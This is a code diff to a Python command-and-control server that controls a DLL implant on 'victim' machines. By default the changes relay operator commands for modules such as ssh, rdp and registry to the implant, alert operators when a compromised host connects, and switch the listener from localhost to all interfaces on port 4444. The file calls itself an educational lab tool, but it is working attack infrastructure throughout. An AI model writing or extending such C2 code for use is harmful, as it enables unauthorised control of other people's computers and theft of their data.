@@ -19,6 +19,7 @@ import socket
 import ssl
 import sys
 import threading
+from typing import Any
 from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).parent))
@@ -39,7 +40,13 @@ logging.basicConfig(
 log = logging.getLogger("c2_server")
 
 # ── Module registry (server-side Python implementations) ──────────────
-MODULES: dict[str, object] = {
+# All four can answer locally, but dispatch PREFERS the live DLL agent on
+# the victim (dll.cpp implements registry/activity/pivot/... under the same
+# names). Routing rules (see _handle_line):
+#   default            → relay to the connected agent (victim data)
+#   "where":"server"   → force the server-side module below (operator host)
+#   no agent connected → server-side fallback, result carries a loud note
+MODULES: dict[str, Any] = {
     "ssh":      SSHModule(),
     "rdp":      RDPModule(),
     "registry": RegistryModule(),
@@ -56,6 +63,12 @@ _operators: set["ClientHandler"] = set()
 
 _agents_lock = threading.Lock()
 _agents: set["ClientHandler"] = set()
+
+
+def agent_connected() -> bool:
+    """True while at least one DLL agent holds a live session."""
+    with _agents_lock:
+        return bool(_agents)
 
 
 def relay_to_agent(cmd: dict, timeout: float = 30.0) -> dict:
@@ -138,6 +151,14 @@ class ClientHandler(threading.Thread):
             self.role   = msg.get("role", "operator")
             self.authed = True
             self._register()
+            if self.role == "agent":
+                # Tell every operator a target just arrived — closes the
+                # "agent connected but nobody notices" gap.
+                self._broadcast_to_operators({
+                    "event":   "agent_joined",
+                    "peer":    f"{self.addr[0]}:{self.addr[1]}",
+                    "message": f"New agent connected from {self.addr[0]}:{self.addr[1]}",
+                })
             log.info("Authenticated: %s:%s  role=%s", *self.addr, self.role)
             self._send({"status": "ok", "message": f"Authenticated as {self.role}"})
             return
@@ -186,6 +207,12 @@ class ClientHandler(threading.Thread):
             _operators.discard(self)
         with _agents_lock:
             _agents.discard(self)
+        if self.role == "agent" and getattr(self, "authed", False):
+            self._broadcast_to_operators({
+                "event":   "agent_left",
+                "peer":    f"{self.addr[0]}:{self.addr[1]}",
+                "message": f"Agent {self.addr[0]}:{self.addr[1]} disconnected",
+            })
 
     # ------------------------------------------------------------------
     def forward(self, cmd: dict, timeout: float = 30.0) -> dict:
@@ -223,6 +250,14 @@ class ClientHandler(threading.Thread):
             self.role   = msg.get("role", "operator")
             self.authed = True
             self._register()
+            if self.role == "agent":
+                # Tell every operator a target just arrived — closes the
+                # "agent connected but nobody notices" gap.
+                self._broadcast_to_operators({
+                    "event":   "agent_joined",
+                    "peer":    f"{self.addr[0]}:{self.addr[1]}",
+                    "message": f"New agent connected from {self.addr[0]}:{self.addr[1]}",
+                })
             log.info("Authenticated: %s:%s  role=%s", *self.addr, self.role)
             self._send({"status": "ok", "message": f"Authenticated as {self.role}"})
             return
@@ -247,21 +282,43 @@ class ClientHandler(threading.Thread):
         # ── Operator: module command ───────────────────────────────────
         module_name = msg.get("module", "")
         payload     = msg.get("payload", {})
+        module      = MODULES.get(module_name)
 
-        # Try local Python module first; fall back to relaying to DLL agent
-        module = MODULES.get(module_name)
-        if module:
-            log.info("Dispatch module=%r action=%r by %s:%s",
-                     module_name, payload.get("action"), *self.addr)
+        def _run_local() -> dict:
             try:
-                result = module.handle(payload)
+                return module.handle(payload)
             except Exception as exc:
                 log.exception("Module %r raised: %s", module_name, exc)
-                result = {"status": "error", "message": str(exc)}
-        else:
+                return {"status": "error", "message": str(exc)}
+
+        if msg.get("where") == "server":
+            # Explicit opt-in: answer from this (operator) host even with a
+            # live target agent connected.
+            if module is None:
+                result = {"status": "error",
+                          "message": f"No server-side module {module_name!r}. "
+                                     f"Available: {list(MODULES)}"}
+            else:
+                log.info("Dispatch module=%r action=%r (server-side, requested) by %s:%s",
+                         module_name, payload.get("action"), *self.addr)
+                result = _run_local()
+        elif agent_connected():
+            # Default: the target answers. Victim data beats host data.
             log.info("Relay module=%r action=%r → agent",
                      module_name, payload.get("action"))
             result = relay_to_agent({"module": module_name, "payload": payload})
+        elif module is not None:
+            # Offline fallback: same module runs locally, clearly labelled.
+            log.info("Dispatch module=%r action=%r (server-side, offline fallback) by %s:%s",
+                     module_name, payload.get("action"), *self.addr)
+            result = _run_local()
+            if isinstance(result, dict) and result.get("status") == "ok":
+                result.setdefault("note", "EXECUTED ON THE C2 SERVER HOST — "
+                            "no target agent is connected; data is NOT from the victim.")
+        else:
+            result = {"status": "error",
+                      "message": f"Unknown module {module_name!r} and no agent "
+                                 f"connected. Server-side modules: {list(MODULES)}"}
 
         self._send(result)
 
@@ -296,7 +353,7 @@ class ClientHandler(threading.Thread):
 class C2Server:
     def __init__(
         self,
-        host: str   = "127.0.0.1",
+        host: str   = "0.0.0.0",
         port: int   = 4444,
         certfile: str | None = None,
         keyfile:  str | None = None,
@@ -348,9 +405,9 @@ class C2Server:
 
 def parse_args():
     p = argparse.ArgumentParser(
-        description="C2 Server — for authorized research/lab use only."
+        description="Educational C2 Server — for lab/course use only."
     )
-    p.add_argument("--host",     default="127.0.0.1")
+    p.add_argument("--host",     default="0.0.0.0")
     p.add_argument("--port",     type=int, default=4444)
     p.add_argument("--certfile", default=None)
     p.add_argument("--keyfile",  default=None)
